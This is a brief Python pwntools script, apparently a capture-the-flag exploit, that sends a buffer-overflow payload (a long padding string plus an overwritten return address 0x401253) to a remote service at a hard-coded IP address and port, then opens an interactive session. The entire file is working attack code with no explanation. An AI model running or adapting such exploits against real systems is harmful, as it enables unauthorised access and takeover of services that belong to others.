#!/usr/bin/python
from pwn import *

payload = "A"*0x418 + "7" + p64(0x401253)
r=remote('35.186.153.116', 5001)
r.sendline(payload)
r.interactive()
